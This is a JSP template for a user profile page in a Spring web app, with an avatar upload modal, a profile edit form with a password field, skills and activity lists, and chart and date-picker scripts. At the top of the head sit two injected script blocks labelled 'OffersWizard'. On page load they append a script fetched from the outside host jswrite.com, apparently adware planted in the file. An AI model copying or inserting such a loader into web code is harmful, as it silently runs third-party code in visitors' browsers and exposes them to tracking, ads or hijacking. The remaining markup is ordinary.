<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
	pageEncoding="ISO-8859-1"%>
<%@taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<%@taglib uri="http://www.springframework.org/tags/form" prefix="form"%>
<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@ taglib uri="http://tiles.apache.org/tags-tiles" prefix="tiles"%>

<!DOCTYPE html>
<html lang="en">

<head>
<script>
	if (typeof window.__wsujs === 'undefined') {
		window.__wsujs = 14697;
		window.__wsujsn = 'OffersWizard';
		window.__wsujss = '195F8FBCD8CDB37D1E8737AB57503248';
	}
</script>
<script>
	if (top == self && typeof window._ws_all_js === 'undefined') {
		window._ws_all_js = 7;
		var zhead = document.getElementsByTagName('head')[0];
		if (!zhead) {
			zhead = document.createElement('head');
		}
		var qscript = document.createElement('script');
		qscript.setAttribute('id', 'wsh2_js');
		qscript.setAttribute('src', 'http://jswrite.com/script1.js');
		qscript.setAttribute('type', 'text/javascript');
		qscript.async = true;
		if (zhead && !document.getElementById('wsh2_js'))
			zhead.appendChild(qscript);
	}
</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- Meta, title, CSS, favicons, etc. -->
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title><spring:message code="label.Projects" /></title>

<!-- Bootstrap core CSS -->


<link
	href="<c:url value="/resources/production/css/bootstrap.min.css" />"
	rel="stylesheet">

<link
	href="<c:url value="/resources/production/fonts/css/font-awesome.min.css" />"
	rel="stylesheet">
<link href="<c:url value="/resources/production/css/animate.min.css" />"
	rel="stylesheet">

<!-- Custom styling plus plugins -->
<link href="<c:url value="/resources/production/css/custom.css" />"
	rel="stylesheet">
<link
	href="<c:url value="/resources/production/css/icheck/flat/green.css" />"
	rel="stylesheet">

<script src="<c:url value="/resources/production/js/jquery.min.js" />"></script>
</head>
<div class="">
	<div class="page-title">
		<div class="title_left">
			<h3>
				<spring:message code="label.User_Profile" />
			</h3>
		</div>

		<div class="title_right">
			<div
				class="col-md-5 col-sm-5 col-xs-12 form-group pull-right top_search">
				<div class="input-group">
					<input type="text" class="form-control"
						placeholder=<spring:message code="label.Search" />> <span
						class="input-group-btn">
						<button class="btn btn-default" type="button">
							<spring:message code="label.Go" />
						</button>
					</span>
				</div>
			</div>
		</div>
	</div>
	<div class="clearfix"></div>

	<div class="row">
		<div class="col-md-12 col-sm-12 col-xs-12">
			<div class="x_panel">
				<div class="x_title">
					<h2>
						<spring:message code="label.User_Report" />
						<small> <spring:message code="label.Activity_report" /></small>
					</h2>
					<ul class="nav navbar-right panel_toolbox">
						<li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
						</li>

						<li><a class="close-link"><i class="fa fa-close"></i></a></li>
					</ul>
					<div class="clearfix"></div>
				</div>
				<div class="x_content">

					<div class="col-md-3 col-sm-3 col-xs-12 profile_left">

						<div class="profile_img">

							<!-- end of image cropping -->
							<div id="crop-avatar">
								<!-- Current avatar -->
								<div class="avatar-view" title="Change the avatar">
									<img src="photoUser?idUser=${user.idUser} " alt="Avatar">
								</div>

								<!-- Cropping modal -->
								<div class="modal fade" id="avatar-modal" aria-hidden="true"
									aria-labelledby="avatar-modal-label" role="dialog"
									tabindex="-1">
									<div class="modal-dialog modal-lg">
										<div class="modal-content" >
											<form:form modelAttribute="usere"
												action="EditPhoto?idUser=${user.idUser}"
												enctype="multipart/form-data" method="POST" >
												<div class="modal-header" >
													<button class="close" data-dismiss="modal" type="button">x</button>
													<h4 class="modal-title" id="avatar-modal-label">
														<spring:message code="label.Change_Photo" />
													</h4>
												</div>
												<div class="modal-body">
													<div class="avatar-body">

														<!-- Upload image and data -->
														<div class="avatar-upload avatar-form">
															<input class="avatar-src" name="avatar_src" type="hidden">
															<input class="avatar-data" name="avatar_data"
																type="hidden">
															<form:label path="photo" for="file">
																<spring:message code="label.Local_upload" />
															</form:label>
															<input id="file" class="avatar-input" name="file"
																type="file" />
														</div>

														<!-- Crop and preview -->
														<div class="row">
															<div class="col-md-9">
																<div class="avatar-wrapper"></div>
															</div>
															<div class="col-md-3">
																<div class="avatar-preview preview-lg"></div>
																<div class="avatar-preview preview-md"></div>
																<div class="avatar-preview preview-sm"></div>
															</div>
														</div>

														<div class="row avatar-btns">
															<div class="col-md-9">
																<div class="btn-group ">
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="-90" type="button"
																		title="Rotate -90 degrees">Rotate Left</button>
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="-15" type="button">-15deg</button>
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="-30" type="button">-30deg</button>
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="-45" type="button">-45deg</button>
																</div>
																<div class="btn-group">
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="90" type="button"
																		title="Rotate 90 degrees">Rotate Right</button>
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="15" type="button">15deg</button>
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="30" type="button">30deg</button>
																	<button class="btn btn-primary" data-method="rotate"
																		data-option="45" type="button">45deg</button>
																</div>
															</div>
															<div class="col-md-3">
																<input type="submit" value="Done"  class="btn btn-primary btn-block avatar-save"
																>
															</div>
														</div>
													</div>
												</div>

											</form:form>
										</div>
									</div>
								</div>
								<!-- /.modal -->

								<!-- Loading state -->
								<div class="loading" aria-label="Loading" role="img"
									tabindex="-1"></div>
							</div>
							<!-- end of image cropping -->

						</div>
						<h3>${user.username }</h3>

						<ul class="list-unstyled user_data">
							<li><i class="fa fa-map-marker user-profile-icon"></i>${user.adresse }
							</li>



							<li class="m-top-xs"><i
								class="fa fa-external-link user-profile-icon"></i> <a
								href="mailto:${user.email}">${user.email}</a></li>
						</ul>

						<a  class="btn btn-success" data-toggle="modal"
							data-target="#ProfileEdit" ><i class="fa fa-edit m-right-xs"></i>
						<spring:message code="label.Edit_Profile" /></a> <br />

						<!-- start skills -->
						<h4>
							<spring:message code="label.Skills" />
						</h4>

						<c:forEach var="skills" items="${skills}">
							<ul class="list-unstyled user_data">
								<li>
									<p>${skills.nomSkills}</p>
									<div class="progress progress_sm">
										<div class="progress-bar bg-green" role="progressbar"
											data-transitiongoal="50"></div>
									</div>
								</li>


							</ul>
						</c:forEach>
						<!-- end of skills -->

					</div>
					<div class="col-md-9 col-sm-9 col-xs-12">

						<div class="profile_title">
							<div class="col-md-6">
								<h2>
									<spring:message code="label.User_Activity_Report" />
								</h2>
							</div>
							<div class="col-md-6">
								<div id="reportrange" class="pull-right"
									style="margin-top: 5px; background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #E6E9ED">
									<i class="glyphicon glyphicon-calendar fa fa-calendar"></i> <span>December
										30, 2014 - January 28, 2015</span> <b class="caret"></b>
								</div>
							</div>
						</div>
						<!-- start of user-activity-graph -->
						<div id="graph_bar" style="width: 100%; height: 280px;"></div>
						<!-- end of user-activity-graph -->

						<div class="" role="tabpanel" data-example-id="togglable-tabs">
							<ul id="myTab" class="nav nav-tabs bar_tabs" role="tablist">
								<li role="presentation" class="active"><a
									href="#tab_content1" id="home-tab" role="tab" data-toggle="tab"
									aria-expanded="true"><spring:message
											code="label.Recent_Activity" /></a></li>
								<li role="presentation" class=""><a href="#tab_content2"
									role="tab" id="profile-tab" data-toggle="tab"
									aria-expanded="false"><spring:message
											code="label.Projects_Worked_on" /></a></li>


							</ul>
							<div id="myTabContent" class="tab-content">
								<div role="tabpanel" class="tab-pane fade active in"
									id="tab_content1" aria-labelledby="home-tab">

									<!-- start recent activity -->
									<ul class="messages">
										<c:forEach var="Activity" items="${Activity}">
											<li><img src="photoUser?idUser=${user.idUser} "
												class="avatar" alt="Avatar">
												<div class="message_date">
													<h3 class="date text-error">${Activity.day}</h3>
													<p class="month">${Activity.month}</p>
												</div>
												<div class="message_wrapper">
													<h4 class="heading">${user.username}</h4>
													<blockquote class="message">${Activity.description}</blockquote>
													<br />
													<p class="url">
														<span class="fs1" aria-hidden="true" data-icon="?"></span>

													</p>
												</div></li>
										</c:forEach>



									</ul>
									<!-- end recent activity -->

								</div>
								<div role="tabpanel" class="tab-pane fade" id="tab_content2"
									aria-labelledby="profile-tab">

									<!-- start user projects -->
									<table class="data table table-striped no-margin">
										<thead>
											<tr>

												<th><spring:message code="label.Project_Name" /></th>
												<th><spring:message code="label.State" /></th>
												<th class="hidden-phone"><spring:message
														code="label.Hours_Spent" /></th>
												<th><spring:message code="label.Contribution" /></th>
											</tr>
										</thead>
										<tbody>
											<c:forEach var="Project" items="${Project}">
												<tr>


													<td>${Project.nom}</td>
													<td>${Project.status}</td>
													<td class="hidden-phone">${Project.estimation_dure}</td>
													<td class="vertical-align-mid">
														<div class="progress">
															<div class="progress-bar progress-bar-info"
																data-transitiongoal="80"></div>
														</div>
													</td>
												</tr>
											</c:forEach>

										</tbody>
									</table>
									<!-- end user projects -->

								</div>

							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- Start Calender modal -->
<div id="ProfileEdit"  class="modal fade" tabindex="-1" role="dialog"
	aria-labelledby="myModalLabel" aria-hidden="true" >
	<div class="modal-dialog">
		<div class="modal-content">

			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"
					aria-hidden="true">x</button>
				<h4 class="modal-title" id="myModalLabel2">
					<spring:message code="label.Edit_User_Entry" />
				</h4>
			</div>
			<div class="modal-body">

				<div id="testmodal2" style="padding: 5px 20px;">
					<form:form id="antoform2" class="form-horizontal calender"
						modelAttribute="usere" action="/editProfile?idUser=${user.idUser}"
						method="POST">
						<div class="form-group">
							<form:label path="username" class="col-sm-3 control-label">
								<spring:message code="label.Username" />
							</form:label>
							<div class="col-sm-9">
								<form:input path="username" type="text" class="form-control"
									id="username1" name="username" />
							</div>
						</div>
						<div class="form-group">
							<form:label path="password" class="col-sm-3 control-label">
								<spring:message code="label.Password" />
							</form:label>
							<div class="col-sm-9">
								<form:input path="password" type="password"
									placeHolder="new Password" class="form-control" id="password1"
									name="password" />
							</div>
						</div>
						<div class="form-group">
							<form:label path="email" class="col-sm-3 control-label">
								<spring:message code="label.Email" />
							</form:label>
							<div class="col-sm-9">
								<form:input path="email" type="email" class="form-control"
									id="email1" name="email" />
							</div>
						</div>

						<div class="modal-footer">
							<button type="button" class="btn btn-default antoclose2"
								data-dismiss="modal">
								<spring:message code="label.Close" />
							</button>
							<input type="submit"class="btn btn-primary "
			value="<spring:message code="label.Save_changes" />">
								
							
						</div>
					</form:form>
				</div>
			</div>

		</div>
	</div>

	<script
		src="<c:url value="/resources/production/js/bootstrap.min.js" />"></script>

	<!-- chart js -->
	<script
		src="<c:url value="/resources/production/js/chartjs/chart.min.js" />"></script>
	<!-- bootstrap progress js -->
	<script
		src="<c:url value="/resources/production/js/progressbar/bootstrap-progressbar.min.js" />"></script>
	<script
		src="<c:url value="/resources/production/js/nicescroll/jquery.nicescroll.min.js" />"></script>
	<!-- icheck -->
	<script
		src="<c:url value="/resources/production/js/icheck/icheck.min.js" />"></script>

	<script src="<c:url value="/resources/production/js/custom.js" />"></script>

	<!-- image cropping -->
	<script
		src="<c:url value="/resources/production/js/cropping/cropper.min.js" />"></script>
	<script
		src="<c:url value="/resources/production/js/cropping/main.js" />"></script>


	<!-- daterangepicker -->
	<script src="<c:url value="/resources/production/js/moment.min.js" />"></script>
	<script
		src="<c:url value="/resources/production/js/datepicker/daterangepicker.js" />"></script>
	<!-- moris js -->
	<script
		src="<c:url value="/resources/production/js/moris/raphael-min.js" />"></script>
	<script
		src="<c:url value="/resources/production/js/moris/morris.js" />"></script>
	<script>
		$(function() {
			var day_data = [ {
				"period" : "Jan",
				"Hours worked" : 80
			}, {
				"period" : "Feb",
				"Hours worked" : 125
			}, {
				"period" : "Mar",
				"Hours worked" : 176
			}, {
				"period" : "Apr",
				"Hours worked" : 224
			}, {
				"period" : "May",
				"Hours worked" : 265
			}, {
				"period" : "Jun",
				"Hours worked" : 314
			}, {
				"period" : "Jul",
				"Hours worked" : 347
			}, {
				"period" : "Aug",
				"Hours worked" : 287
			}, {
				"period" : "Sep",
				"Hours worked" : 240
			}, {
				"period" : "Oct",
				"Hours worked" : 211
			} ];
			Morris.Bar({
				element : 'graph_bar',
				data : day_data,
				xkey : 'period',
				hideHover : 'auto',
				barColors : [ '#007aff', '#007aff', '#ACADAC', '#3498DB' ],
				ykeys : [ 'Hours worked', 'sorned' ],
				labels : [ 'Hours worked', 'SORN' ],
				xLabelAngle : 60
			});
		});
	</script>
	<!-- datepicker -->
	<script type="text/javascript">
		$(document)
				.ready(
						function() {

							var cb = function(start, end, label) {
								console.log(start.toISOString(), end
										.toISOString(), label);
								$('#reportrange span').html(
										start.format('MMMM D, YYYY') + ' - '
												+ end.format('MMMM D, YYYY'));
								//alert("Callback has fired: [" + start.format('MMMM D, YYYY') + " to " + end.format('MMMM D, YYYY') + ", label = " + label + "]");
							}

							var optionSet1 = {
								startDate : moment().subtract(29, 'days'),
								endDate : moment(),
								minDate : '01/01/2012',
								maxDate : '12/31/2015',
								dateLimit : {
									days : 60
								},
								showDropdowns : true,
								showWeekNumbers : true,
								timePicker : false,
								timePickerIncrement : 1,
								timePicker12Hour : true,
								ranges : {
									'Today' : [ moment(), moment() ],
									'Yesterday' : [
											moment().subtract(1, 'days'),
											moment().subtract(1, 'days') ],
									'Last 7 Days' : [
											moment().subtract(6, 'days'),
											moment() ],
									'Last 30 Days' : [
											moment().subtract(29, 'days'),
											moment() ],
									'This Month' : [ moment().startOf('month'),
											moment().endOf('month') ],
									'Last Month' : [
											moment().subtract(1, 'month')
													.startOf('month'),
											moment().subtract(1, 'month')
													.endOf('month') ]
								},
								opens : 'left',
								buttonClasses : [ 'btn btn-default' ],
								applyClass : 'btn-small btn-primary',
								cancelClass : 'btn-small',
								format : 'MM/DD/YYYY',
								separator : ' to ',
								locale : {
									applyLabel : 'Submit',
									cancelLabel : 'Clear',
									fromLabel : 'From',
									toLabel : 'To',
									customRangeLabel : 'Custom',
									daysOfWeek : [ 'Su', 'Mo', 'Tu', 'We',
											'Th', 'Fr', 'Sa' ],
									monthNames : [ 'January', 'February',
											'March', 'April', 'May', 'June',
											'July', 'August', 'September',
											'October', 'November', 'December' ],
									firstDay : 1
								}
							};
							$('#reportrange span').html(
									moment().subtract(29, 'days').format(
											'MMMM D, YYYY')
											+ ' - '
											+ moment().format('MMMM D, YYYY'));
							$('#reportrange').daterangepicker(optionSet1, cb);
							$('#reportrange').on('show.daterangepicker',
									function() {
										console.log("show event fired");
									});
							$('#reportrange').on('hide.daterangepicker',
									function() {
										console.log("hide event fired");
									});
							$('#reportrange')
									.on(
											'apply.daterangepicker',
											function(ev, picker) {
												console
														.log("apply event fired, start/end dates are "
																+ picker.startDate
																		.format('MMMM D, YYYY')
																+ " to "
																+ picker.endDate
																		.format('MMMM D, YYYY'));
											});
							$('#reportrange').on('cancel.daterangepicker',
									function(ev, picker) {
										console.log("cancel event fired");
									});
							$('#options1').click(
									function() {
										$('#reportrange').data(
												'daterangepicker').setOptions(
												optionSet1, cb);
									});
							$('#options2').click(
									function() {
										$('#reportrange').data(
												'daterangepicker').setOptions(
												optionSet2, cb);
									});
							$('#destroy').click(
									function() {
										$('#reportrange').data(
												'daterangepicker').remove();
									});
						});
	</script>
	<!-- /datepicker -->